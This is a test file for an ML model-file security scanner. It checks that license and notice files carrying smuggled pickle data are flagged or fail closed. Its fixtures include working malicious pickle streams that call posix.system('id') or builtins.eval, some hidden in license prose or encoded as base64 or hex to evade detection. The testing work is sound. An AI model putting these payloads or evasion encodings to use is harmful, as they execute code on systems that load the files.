@pytest.mark.parametrize(
    ("payload", "expected_import_reference"),
    [
        pytest.param(
            b"(cmystery_module\nthing\nS'MIT License'\nl.",
            "mystery_module.thing",
            id="complete-stream",
        ),
        pytest.param(
            b"cmystery_module\nthing\n.MIT License\nCopyright Example\n",
            "mystery_module.thing",
            id="complete-prefix-with-trailing-prose",
        ),
        pytest.param(
            b"cmystery_module\nthing\nApache License\n",
            "mystery_module.thing",
            id="import-before-invalid-continuation",
        ),
        pytest.param(
            b"copyright\nnotice\n.\nMIT License\n",
            "opyright.notice",
            id="legal-looking-GLOBAL-operands",
        ),
    ],
)
def test_scan_file_reports_import_only_global_in_protocol0_license(
    tmp_path: Path,
    payload: bytes,
    expected_import_reference: str,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(payload)

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["pickle"]
    assert determine_exit_code(result) == 1
    assert any(
        issue.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and issue.details.get("import_reference") == expected_import_reference
        for issue in result.issues
    )


def test_scan_file_fails_closed_for_inst_before_invalid_continuation(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b"(imystery_module\nThing\nApache License\n")

    result = scan_file(str(path), config={"cache_enabled": False})

    _assert_incomplete_pickle_routing(result, path)


@pytest.mark.parametrize(
    "pickle_stream",
    [
        pytest.param(b"cwebbrowser\nopen \n.", id="GLOBAL-trailing-space"),
        pytest.param(b"(iwebbrowser\nopen \n.", id="INST-trailing-space"),
        pytest.param(b"PPermission is granted.\n.", id="PERSID-prose-operand"),
    ],
)
def test_scan_file_fails_closed_for_complete_prose_shaped_pickle_callback(
    tmp_path: Path,
    pickle_stream: bytes,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b"MIT License\n" + pickle_stream)

    result = scan_file(str(path), config={"cache_enabled": False})

    _assert_incomplete_pickle_routing(result, path)


@pytest.mark.parametrize(
    "encoder",
    [
        pytest.param(base64.b64encode, id="base64"),
        pytest.param(binascii.hexlify, id="hex"),
    ],
)
@pytest.mark.parametrize(
    ("payload", "expected_exit_code"),
    [
        pytest.param(b"cmystery_module\nthing\nApache License\n", 1, id="GLOBAL"),
        pytest.param(b"(imystery_module\nThing\nApache License\n", 2, id="INST"),
    ],
)
def test_scan_file_rejects_encoded_import_before_invalid_continuation(
    tmp_path: Path,
    encoder: Callable[[bytes], bytes],
    payload: bytes,
    expected_exit_code: int,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(encoder(payload))

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert determine_exit_code(result) == expected_exit_code
    if expected_exit_code == 1:
        assert result.scanner_names == ["pickle"]
        assert any(issue.rule_code == "S901" for issue in result.issues)
    else:
        assert result.success is False
        assert any(check.name == "Pickle Routing" for check in result.checks)


@pytest.mark.parametrize(
    ("payload", "expected_exit_code"),
    [
        pytest.param(
            b"C\tAAAAAAAAAcmystery_module\nthing\nApache License\n",
            1,
            id="short-binbytes-then-GLOBAL",
        ),
        pytest.param(b"imystery_module\nThing\nApache License\n", 2, id="initial-INST-without-MARK"),
        pytest.param(
            b"MIT License\n(imystery_module\nThing\nApache License\n",
            2,
            id="embedded-stack-valid-INST",
        ),
        pytest.param(base64.b64encode(b"cb\nx\n."), 1, id="short-base64"),
        pytest.param(binascii.hexlify(b"cb\nx\n."), 1, id="short-hex"),
        pytest.param(
            _wrap_encoded_lines(base64.b64encode(b"cbuiltins\neval\n(V1+1\ntR."), 8),
            1,
            id="line-wrapped-base64",
        ),
        pytest.param(
            _wrap_encoded_lines(binascii.hexlify(b"cbuiltins\neval\n(V1+1\ntR."), 18),
            1,
            id="line-wrapped-hex",
        ),
        pytest.param(b"MIT License\n\x82\x01)R.", 2, id="embedded-EXT1"),
        pytest.param(b"MIT License\nPid\n)R.", 2, id="embedded-PERSID"),
        pytest.param(b"MIT License\nPid\n", 2, id="terminal-embedded-PERSID"),
        pytest.param(b"MIT License\nPid\n0", 2, id="embedded-PERSID-structural-continuation"),
        pytest.param(b"mit\nVb\nVx\n\x93)R.", 2, id="embedded-STACK_GLOBAL-unicode"),
        pytest.param(b"Pid\nApache License\n", 2, id="whole-PERSID"),
        pytest.param(b"PMIT License\n.", 2, id="spaced-PERSID-before-STOP"),
        pytest.param(b"MIT License\nXPid\n)R.\n", 2, id="adjacent-embedded-PERSID"),
        pytest.param(b"\x82\x01", 1, id="sole-EXT1"),
        pytest.param(b"\x97", 1, id="sole-NEXT_BUFFER"),
        pytest.param("cmódulo\nthing\n.".encode(), 1, id="unicode-GLOBAL-operand"),
        pytest.param(b"cevil/module\nthing\nMIT License\n", 1, id="GLOBAL-slash-operand"),
        pytest.param(
            b"MIT License\ncmystery_module\nThing\nApache License\n",
            2,
            id="embedded-import-only-GLOBAL",
        ),
        pytest.param(b"MIT License\ncposix\nopen \nA", 2, id="embedded-GLOBAL-whitespace-side-effect"),
        pytest.param(b"MIT License\nS'id'\nQApache License\n", 2, id="embedded-BINPERSID"),
        pytest.param(b"MIT License\n]QApache License\n", 2, id="same-line-BINPERSID"),
        pytest.param(b"MIT\nXS'id'\nQtext\n", 2, id="mid-line-STRING-before-BINPERSID"),
        pytest.param(
            b"MIT License\nNcposix\nsystem\n(S'id'\ntR.",
            2,
            id="trivial-prefix-before-GLOBAL",
        ),
        pytest.param(
            b"MIT License\nAcposix\nsystem\n(S'id'\ntRApache License\n",
            2,
            id="non-opcode-prefix-before-GLOBAL",
        ),
        pytest.param(b"MIT License\nNPid\n.", 2, id="trivial-prefix-before-PERSID"),
        pytest.param(
            _long_binpersid_lookbehind_in_legal_text(),
            2,
            id="truncated-BINPERSID-lookbehind",
        ),
        pytest.param(
            b"MIT License\nprefix cposix\nsystem\n(S'id'\ntR.",
            2,
            id="mid-line-GLOBAL",
        ),
        pytest.param(
            b"#cposix\nsystem\n(S'id'\ntR.\nMIT License",
            2,
            id="comment-prefixed-GLOBAL",
        ),
        pytest.param(_overlapping_global_candidate_in_legal_text(), 2, id="overlapping-comment-GLOBAL"),
        pytest.param(
            b"MIT License\nCopyright Y2IK eAou\n",
            1,
            id="base64-same-line-prose-prefix",
        ),
        pytest.param(b"MIT License\nY2IK eAou\n", 1, id="base64-intra-line-whitespace"),
        pytest.param(b"MIT License\n63620a 780a2e\n", 1, id="hex-intra-line-whitespace"),
        pytest.param(b"MIT License\nY2IK\n\n eAou\n", 1, id="base64-blank-line-whitespace"),
        pytest.param(b"MIT License\n63620a\n\n 780a2e\n", 1, id="hex-blank-line-whitespace"),
        pytest.param(b"MIT License\n972e\n", 1, id="hex-NEXT_BUFFER-before-STOP"),
        pytest.param(b"MIT License\nY 2IKeAou\n", 1, id="base64-unaligned-intra-line-whitespace"),
        pytest.param(b"MIT License\n6 3620a780a2e\n", 1, id="hex-unaligned-intra-line-whitespace"),
        pytest.param(b"MIT License\nY 2IK\ne Aou\n", 1, id="base64-mixed-line-whitespace"),
        pytest.param(b"MIT License\n63 62\n0a78 0a2e\n", 1, id="hex-mixed-line-whitespace"),
        pytest.param(b"MIT License\nY2IK\teAou\n", 1, id="base64-intra-line-tab"),
        pytest.param(b"MIT License\n63620a\t780a2e\n", 1, id="hex-intra-line-tab"),
        pytest.param(base64.b64encode(b"S'id'\nQ."), 1, id="base64-BINPERSID"),
        pytest.param(binascii.hexlify(b"S'id'\nQ."), 1, id="hex-BINPERSID"),
        pytest.param(b"MIT License\nXVEu\n", 1, id="base64-unpadded-BINPERSID"),
        pytest.param(b"MIT License\nXVE\n", 1, id="base64-unpadded-BINPERSID-before-EOF"),
        pytest.param(b"MIT License\n5d51\n", 1, id="short-hex-BINPERSID-before-EOF"),
        pytest.param(b"MIT License\n" + base64.b64encode(b"\x82\x01"), 1, id="base64-sole-EXT1"),
        pytest.param(b"MIT License\n" + base64.b64encode(b"\x97"), 1, id="base64-sole-NEXT_BUFFER"),
        pytest.param(b"MIT License\nWFBpZAou\n", 2, id="base64-alpha-prefixed-PERSID"),
        pytest.param(b"MIT License\nWF Bp ZA ou\n", 2, id="base64-spaced-alpha-prefixed-PERSID"),
        pytest.param(b"MIT License\nWF Bp\nZA ou\n", 2, id="base64-split-spaced-alpha-prefixed-PERSID"),
        pytest.param(b"MIT License\nggE =\n", 1, id="base64-whitespace-padded-EXT1"),
        pytest.param(b"MIT License\nlw ==\n", 1, id="base64-whitespace-padded-NEXT_BUFFER"),
        pytest.param(b"MIT License\ngwEA\n", 1, id="base64-unpadded-alphabetic-EXT2"),
        pytest.param(b"MIT License\nggE\n", 1, id="base64-unpadded-alphabetic-EXT1"),
        pytest.param(b"MIT License\nlw\n", 1, id="base64-unpadded-alphabetic-NEXT_BUFFER"),
        pytest.param(b"MIT License\ngwEA\nCopyright\n", 1, id="base64-EXT2-before-prose"),
        pytest.param(b"MIT License\nggE\nCopyright\n", 1, id="base64-EXT1-before-prose"),
        pytest.param(b"MIT License\nlw\nCopyright\n", 1, id="base64-NEXT_BUFFER-before-prose"),
        pytest.param(b"MIT License\ngASMAWGMAWGTLg\n", 1, id="base64-alphabetic-protocol-STACK_GLOBAL"),
        pytest.param(b"MIT License\nZXZhbCg\n", 2, id="base64-alphabetic-execution-syntax"),
        pytest.param(
            b"MIT License\nAA AA\ng g\nE\n",
            1,
            id="base64-split-weak-side-effect-alignment-collision",
        ),
        pytest.param(
            b"MIT License\n" + base64.b64encode(b"# comment\ncposix\nsystem\n(S'id'\ntR."),
            2,
            id="base64-overlapping-comment-GLOBAL",
        ),
        pytest.param(_oversized_encoded_execution_after_probe(), 2, id="base64-execution-after-decoded-limit"),
        pytest.param(
            _encoded_pickle_after_benign_candidate_budget(),
            1,
            id="encoded-pickle-after-benign-candidate-budget",
        ),
        pytest.param(
            _encoded_pickle_after_benign_candidate_budget(b"groups"),
            1,
            id="encoded-pickle-after-weak-candidate-budget",
        ),
        pytest.param(_long_global_operand_in_legal_text(), 2, id="truncated-GLOBAL-operand"),
    ],
)
def test_scan_file_rejects_shared_structural_pickle_bypasses(
    tmp_path: Path,
    payload: bytes,
    expected_exit_code: int,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(payload)

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert determine_exit_code(result) == expected_exit_code
    assert result.scanner_names == (["pickle"] if expected_exit_code == 1 else [])
    if expected_exit_code == 2:
        assert result.success is False
        assert any(check.name == "Pickle Routing" for check in result.checks)


def test_scan_file_keeps_allowlisted_import_only_global_on_pickle_route(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b"(cbuiltins\nset\nS'MIT License'\nl.")

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["pickle"]
    assert determine_exit_code(result) == 0
    assert not any(issue.rule_code == "NON_ALLOWLISTED_GLOBAL" for issue in result.issues)


def test_scan_file_routes_malicious_lightgbm_named_license_before_text(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(_malicious_lightgbm_legal_payload())

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["lightgbm"]
    assert determine_exit_code(result) == 1
    assert any(
        check.name == "Command Indicator Check"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_file_routes_oversized_lightgbm_named_license_before_text(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    payload = _malicious_lightgbm_legal_payload()
    path.write_bytes(payload + (b" " * (_LEGAL_TEXT_ROUTE_MAX_BYTES + 1 - len(payload))))

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["lightgbm"]
    assert determine_exit_code(result) == 1
    assert any(
        check.name == "Command Indicator Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_routes_xgboost_json_named_license_before_text(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(_xgboost_json_legal_payload())

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["xgboost"]
    assert any(check.name == "XGBoost JSON Structure Validation" for check in result.checks)
    assert any(check.name == "JSON Content Analysis" for check in result.checks)


def test_scan_file_fails_closed_for_binary_pickle_embedded_in_license_text(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b"MIT License\nCopyright (c) Example\n" + b"\x80\x04cposix\nsystem\n(S'id'\ntR.")

    result = scan_file(str(path), config={"cache_enabled": False})

    _assert_incomplete_pickle_routing(result, path)


def test_scan_file_fails_closed_for_protocolless_binary_pickle_embedded_in_license_text(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    protocol_less_pickle = b"\x8c\x0emystery_module\x8c\x05thing\x93)R."
    path.write_bytes(b"MIT License\nCopyright Example\n" + protocol_less_pickle)

    result = scan_file(str(path), config={"cache_enabled": False})

    _assert_incomplete_pickle_routing(result, path)


@pytest.mark.parametrize(
    "encoder",
    [
        pytest.param(base64.b64encode, id="base64"),
        pytest.param(binascii.hexlify, id="hex"),
    ],
)
def test_scan_file_fails_closed_for_encoded_execution_syntax(
    tmp_path: Path,
    encoder: Callable[[bytes], bytes],
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(encoder(b"os.system('id')"))

    result = scan_file(str(path), config={"cache_enabled": False})

    _assert_incomplete_pickle_routing(result, path)


@pytest.mark.parametrize(
    "encoder",
    [
        pytest.param(base64.b64encode, id="base64"),
        pytest.param(binascii.hexlify, id="hex"),
    ],
)
def test_scan_file_keeps_benign_encoded_execution_word_on_text_route(
    tmp_path: Path,
    encoder: Callable[[bytes], bytes],
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b"MIT License\n" + encoder(b"hello subprocess world") + b"\n")

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["text"]
    assert determine_exit_code(result) == 0


@pytest.mark.parametrize(
    "payload",
    [
        pytest.param("MIT License\n∂\n".encode(), id="utf8-partial-pickle-symbol"),
        pytest.param(
            b"MIT License\nPermission is granted to groups of users.\n",
            id="base64-word-groups",
        ),
        pytest.param(b"MIT License\ngroups\n", id="standalone-base64-word-groups"),
        pytest.param(b"MIT License\nCopyright grou ps\n", id="same-line-base64-word-groups"),
        pytest.param(b"MIT License\ngAROLg\n", id="base64-alphabetic-benign-protocol"),
        pytest.param(b"MIT License\nZXZhbA\n", id="base64-alphabetic-execution-near-match"),
        pytest.param(
            b"MIT License\nAA AA\ng r o u\np s\n",
            id="base64-split-word-groups-alignment-collision",
        ),
        pytest.param(b"MIT License\n" + (b"license " * 4096), id="candidate-budget-license-words"),
        pytest.param(b"MIT License\n" + (b"groups " * 4096), id="candidate-budget-groups-words"),
        pytest.param(
            b"MIT License\n" + (b"copyright\nconditions\n" * 4096),
            id="candidate-budget-global-word-lines",
        ),
        pytest.param(
            b"Permission is granted to users.\nPermission remains granted.\n",
            id="two-P-leading-prose-lines",
        ),
        pytest.param(
            b"MIT License\nPermission is\ngranted to\nall users\n",
            id="multiline-spaced-alphabetic-prose",
        ),
        pytest.param(
            b"MIT License\nPURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE AUTHORS BE LIABLE.\n",
            id="single-word-P-leading-prose-line",
        ),
        pytest.param(
            b"MIT License\nFOR ANY PARTICULAR PURPOSE OR THAT THE USE OF PYTHON WILL NOT\n",
            id="base64-shaped-uppercase-prose",
        ),
        pytest.param(
            b"MIT License\ncopyright\ncopyright\nconditions\ninclude\n",
            id="overlapping-global-inst-prose-lines",
        ),
        pytest.param(
            b"MIT License\nSoftware is provided.\nQuality terms apply.\n",
            id="context-opcode-leading-prose-lines",
        ),
        pytest.param(
            b"MIT License\n]AQuality terms apply.\n",
            id="same-line-context-opcode-near-match",
        ),
        pytest.param(
            b"MIT License\nXS'id'\nZtext\n",
            id="mid-line-STRING-without-opcode-continuation",
        ),
        pytest.param(
            b"MIT License\nNcopyright\nconditions\ninclude\n",
            id="trivial-prefix-like-global-prose",
        ),
        pytest.param(
            b"MIT License\nAcopyright\nconditions\ninclude\n",
            id="non-opcode-prefix-like-global-prose",
        ),
        pytest.param(
            b"MIT License\nNPermission\nterms\n",
            id="trivial-prefix-like-persid-prose",
        ),
        pytest.param(b"MIT License\nin to of be dead face\n", id="short-base64-and-hex-words"),
        pytest.param(b"MIT License\n" + (b"in be " * 4096), id="short-base64-word-budget"),
        pytest.param(_long_context_opcode_prose(), id="long-context-opcode-leading-prose"),
        pytest.param(_large_zero_fill_base64_legal_text(), id="oversized-zero-fill-base64-prose"),
    ],
)
def test_scan_file_keeps_structural_pickle_near_match_prose_on_text_route(
    tmp_path: Path,
    payload: bytes,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(payload)

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    grammar_owned = {
        b"MIT License\nPermission is granted to groups of users.\n",
        b"Permission is granted to users.\nPermission remains granted.\n",
        b"MIT License\nPermission is\ngranted to\nall users\n",
        b"MIT License\n" + (b"copyright\nconditions\n" * 4096),
        b"MIT License\nPURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE AUTHORS BE LIABLE.\n",
        b"MIT License\ncopyright\ncopyright\nconditions\ninclude\n",
        b"MIT License\nSoftware is provided.\nQuality terms apply.\n",
        b"MIT License\nNcopyright\nconditions\ninclude\n",
        b"MIT License\nAcopyright\nconditions\ninclude\n",
        b"MIT License\nNPermission\nterms\n",
        _long_context_opcode_prose(),
    }
    expected_exit_code = 2 if payload in grammar_owned else 0
    assert result.scanner_names == ([] if expected_exit_code == 2 else ["text"])
    assert determine_exit_code(result) == expected_exit_code
    assert result.success is (expected_exit_code == 0)
    assert any(check.name == "Pickle Routing" for check in result.checks) is (expected_exit_code == 2)


def test_scan_file_fails_closed_for_urlsafe_base64_encoded_pickle(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    embedded_pickle = b"\xfb" + b"cposix\nsystem\n(S'id'\ntR."
    token = base64.urlsafe_b64encode(embedded_pickle)
    assert b"-" in token or b"_" in token
    path.write_bytes(b"MIT License\nCopyright Example\n" + token + b"\n")

    result = scan_file(str(path), config={"cache_enabled": False})

    _assert_incomplete_pickle_routing(result, path)


@pytest.mark.parametrize(
    "leading_pickle",
    [
        pytest.param(_build_malicious_pickle(), id="binary"),
        pytest.param(b"cposix\nsystem\n(S'id'\ntR.", id="protocol0"),
    ],
)
def test_scan_file_routes_proven_leading_pickle_before_oversized_legal_fallback(
    tmp_path: Path,
    leading_pickle: bytes,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(_over_budget_legal_payload(leading_pickle))

    result = scan_file(str(path), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert result.success is False
    assert _has_pickle_execution_finding(result)
    assert any(issue.rule_code == "S201" for issue in result.issues)


@pytest.mark.parametrize(
    "payload",
    [
        pytest.param(_long_embedded_protocol0_pickle_in_legal_text(), id="long-embedded-GLOBAL"),
        pytest.param(b"Pid\n", id="terminal-initial-PERSID"),
        pytest.param(b"Ppermission is hereby granted.\n", id="spaced-initial-PERSID"),
        pytest.param(b"MIT License\nP\n\t.", id="embedded-PERSID-whitespace-tail"),
        pytest.param(b"MIT License\ncmalicious\nsystem\n\n", id="embedded-GLOBAL-whitespace-tail"),
        pytest.param(b"MIT License\nimalicious\nsystem\n", id="embedded-INST-terminal"),
        pytest.param(_long_global_operand_in_legal_text(), id="truncated-GLOBAL-operand"),
        pytest.param(
            b"MIT License\nprefix cposix\nsystem\n(S'id'\ntR.",
            id="mid-line-GLOBAL",
        ),
        pytest.param(
            b"imystery_module\nThing\nApache License\n",
            id="initial-INST-without-MARK",
        ),
    ],
)
def test_scan_file_fails_closed_for_structural_legal_pickle_candidate_and_does_not_cache(
    tmp_path: Path,
    payload: bytes,
) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(payload)
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for result in (first, second):
            assert result.success is False
            assert determine_exit_code(result) == 2
            assert result.scanner_names == []
            assert any(check.name == "Pickle Routing" for check in result.checks)
            assert result.file_metadata[str(path)]["scan_outcome"] == "inconclusive"

        stats = get_cache_manager(str(cache_dir), enabled=True).get_stats()
        assert stats["cache_hits"] == 0
        assert stats["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_fails_closed_for_over_budget_legal_sidecar_and_does_not_cache(tmp_path: Path) -> None:
    path = tmp_path / "NOTICE"
    prefix = b"NOTICE\nCopyright (c) Example\n"
    malicious_tail = b"cposix\nsystem\n(S'id'\ntR."
    path.write_bytes(_over_budget_legal_payload(prefix, malicious_tail))
    cache_dir = tmp_path / "cache"

    direct = scan_file(str(path), config={"cache_enabled": False})
    _assert_incomplete_pickle_routing(direct, path)
    assert not any(issue.rule_code == "S201" for issue in direct.issues)

    reset_cache_manager()
    try:
        for _ in range(2):
            result = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert result.success is False
            assert determine_exit_code(result) == 2
            assert result.scanner_names == []
            metadata = result.file_metadata[str(path)]
            assert metadata["analysis_incomplete"] is True
            assert metadata["scan_outcome"] == "inconclusive"
            assert metadata["scan_outcome_reasons"] == ["pickle_routing_incomplete"]
            assert metadata["operational_error"] is True
            assert metadata["operational_error_reason"] == "pickle_routing_incomplete"
            routing_checks = [check for check in result.checks if check.name == "Pickle Routing"]
            assert len(routing_checks) == 1
            assert routing_checks[0].status == CheckStatus.FAILED
            assert routing_checks[0].severity == IssueSeverity.INFO
            assert (
                routing_checks[0].message
                == "Pickle routing was inconclusive because the bounded structural probe reached its limit"
            )
            assert routing_checks[0].details == {
                "format": PICKLE_ROUTING_INCONCLUSIVE_FORMAT,
                "path": str(path),
            }
            assert not any(issue.rule_code == "S201" for issue in result.issues)

        stats = get_cache_manager(str(cache_dir), enabled=True).get_stats()
        assert stats["cache_hits"] == 0
        assert stats["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_cache_key_includes_scanner_selection_policy(tmp_path: Path) -> None:
    path = tmp_path / "benign.pkl"
    path.write_bytes(pickle.dumps({"payload": "x" * 2048}))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    skip_result = scan_file(
        str(path),
        config={
            "scanners": ["manifest"],
            "cache_enabled": True,
            "cache_dir": str(cache_dir),
            "min_cache_file_size": 0,
        },
    )

    pickle_result = scan_file(
        str(path),
        config={
            "scanners": ["pickle"],
            "cache_enabled": True,
            "cache_dir": str(cache_dir),
            "min_cache_file_size": 0,
        },
    )
    reset_cache_manager()

    assert skip_result.scanner_name == "scanner_selection"
    assert pickle_result.scanner_name == "pickle"


def test_cli_accepts_scanner_selection_options(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        [
            "scan",
            str(path),
            "--scanners",
            "PickleScanner",
            "--format",
            "json",
            "--no-cache",
            "--quiet",
        ],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 1
    output = json.loads(result.output)
    assert output["scanner_names"] == ["pickle"]
    assert output["scanner_selection"]["enabled_scanner_ids"] == ["pickle"]


def test_cli_lists_scanners_without_scan_path() -> None:
    runner = CliRunner()
    result = runner.invoke(cli, ["scan", "--list-scanners"], env={"PROMPTFOO_DISABLE_TELEMETRY": "1"})

    assert result.exit_code == 0
    assert "pickle (PickleScanner)" in result.output
    assert "tf_savedmodel" in result.output


def test_cli_lists_scanners_as_json() -> None:
    runner = CliRunner()
    result = runner.invoke(
        cli,
        ["scan", "--list-scanners", "--format", "json"],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 0
    output = json.loads(result.output)
    assert output["scanners"] == scanner_catalog()
    assert any(scanner["id"] == "pickle" and scanner["class"] == "PickleScanner" for scanner in output["scanners"])


def test_cli_rejects_unknown_scanner(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        ["scan", str(path), "--scanners", "NopeScanner"],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 2
    assert "Unknown scanner name" in result.output


def test_cli_unknown_scanner_suggests_closest_match(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        ["scan", str(path), "--scanners", "picle"],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 2
    assert "did you mean" in result.output.lower()
    assert "pickle" in result.output


def test_remote_prefilters_use_selected_scanner_extensions() -> None:
    policy = resolve_scanner_selection_policy(scanners=["safetensors"])
    extensions = selected_scanner_extensions(policy)
    files = [
        {"path": "model.pkl"},
        {"path": "weights.safetensors"},
        {"path": "checkpoint.pt"},
    ]

    assert filter_cloud_scannable_files(files, scannable_extensions=extensions) == [{"path": "weights.safetensors"}]
    assert filter_jfrog_scannable_files(files, scannable_extensions=extensions) == [{"path": "weights.safetensors"}]


def test_remote_prefilters_fail_open_for_header_routed_scanners() -> None:
    policy = resolve_scanner_selection_policy(scanners=["zip"])

    assert selected_scanner_extensions(policy, conservative=True) is None

    files = [
        {"path": "s3://bucket/model.pt"},
        {"path": "s3://bucket/readme.md"},
    ]

    assert {"path": "s3://bucket/model.pt"} in filter_cloud_scannable_files(files, scannable_extensions=None)
    assert {"path": "s3://bucket/model.pt"} in filter_jfrog_scannable_files(files, scannable_extensions=None)


def test_pickle_routing_inconclusive_format_maps_to_pickle_scanner() -> None:
    assert scanner_ids_for_detected_format(PICKLE_ROUTING_INCONCLUSIVE_FORMAT) == frozenset({"pickle"})


def test_remote_safetensors_route_preserves_possible_overlap_scanners() -> None:
    scanner_ids = scanner_ids_for_detected_format("safetensors")

    assert scanner_ids == frozenset(
        {
            "compressed",
            "executorch",
            "keras_h5",
            "keras_zip",
            "llamafile",
            "numpy",
            "pickle",
            "pytorch_zip",
            "safetensors",
            "skops",
            "torch7",
            "torchserve_mar",
            "weight_distribution",
            "zip",
        }
    )


def test_remote_prefilters_preserve_selected_extensionless_scanners() -> None:
    policy = resolve_scanner_selection_policy(scanners=["llamafile"])
    extensions = selected_scanner_extensions(policy, conservative=True)
    files = [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.exe"},
        {"path": "s3://bucket/notes.txt"},
    ]

    assert extensions is not None
    assert "" in extensions
    assert filter_cloud_scannable_files(files, scannable_extensions=extensions) == [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.exe"},
    ]
    assert filter_jfrog_scannable_files(files, scannable_extensions=extensions) == [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.exe"},
    ]


def test_remote_prefilters_preserve_selected_extensionless_content_routed_filenames() -> None:
    policy = resolve_scanner_selection_policy(scanners=["metadata"])
    extensions = selected_scanner_extensions(policy, conservative=True)
    filenames = selected_scanner_filenames(policy, conservative=True)

    assert extensions is not None
    assert "" not in extensions
    assert ".md" in extensions
    assert filenames == frozenset({"readme", "model_card"})
    files = [
        {"path": "s3://bucket/README"},
        {"path": "s3://bucket/model_card"},
        {"path": "s3://bucket/LICENSE"},
    ]

    assert (
        filter_cloud_scannable_files(
            files,
            scannable_extensions=extensions,
            scannable_filenames=filenames,
        )
        == files[:2]
    )
    assert (
        filter_jfrog_scannable_files(
            files,
            scannable_extensions=extensions,
            scannable_filenames=filenames,
        )
        == files[:2]
    )


def test_remote_prefilters_preserve_text_scanner_content_routed_filenames() -> None:
    policy = resolve_scanner_selection_policy(scanners=["text"])
    extensions = selected_scanner_extensions(policy, conservative=True)
    filenames = selected_scanner_filenames(policy, conservative=True)

    assert extensions is not None
    assert "" not in extensions
    assert ".env" in extensions
    assert filenames == frozenset(
        {
            "readme",
            "model_card",
            "license",
            "notice",
            "requirements.txt",
            ".env",
            "vocab.txt",
            "vocabulary.txt",
            "tokens.txt",
            "tokenizer.txt",
            "tokenizer_vocab.txt",
            "tokenizer-vocab.txt",
            "merges.txt",
            "labels.txt",
            "classes.txt",
        }
    )
    files = [
        {"path": "s3://bucket/.env"},
        {"path": "s3://bucket/prod.env"},
        {"path": "s3://bucket/README"},
        {"path": "s3://bucket/LICENSE"},
        {"path": "s3://bucket/NOTICE"},
        {"path": "s3://bucket/model.bin"},
    ]

    assert (
        filter_cloud_scannable_files(
            files,
            scannable_extensions=extensions,
            scannable_filenames=filenames,
        )
        == files[:5]
    )
    assert (
        filter_jfrog_scannable_files(
            files,
            scannable_extensions=extensions,
            scannable_filenames=filenames,
        )
        == files[:5]
    )


def test_remote_prefilters_do_not_download_extensionless_xgboost_candidates() -> None:
    policy = resolve_scanner_selection_policy(scanners=["xgboost"])
    local_extensions = selected_scanner_extensions(policy)
    remote_extensions = selected_scanner_extensions(policy, conservative=True)
    files = [
        {"path": "s3://bucket/model"},
        {"path": "s3://bucket/model.ubj"},
        {"path": "s3://bucket/notes.txt"},
    ]

    assert local_extensions is not None
    assert "" in local_extensions
    assert remote_extensions is not None
    assert "" not in remote_extensions
    assert filter_cloud_scannable_files(files, scannable_extensions=remote_extensions) == [
        {"path": "s3://bucket/model.ubj"}
    ]
    assert filter_jfrog_scannable_files(files, scannable_extensions=remote_extensions) == [
        {"path": "s3://bucket/model.ubj"}
    ]
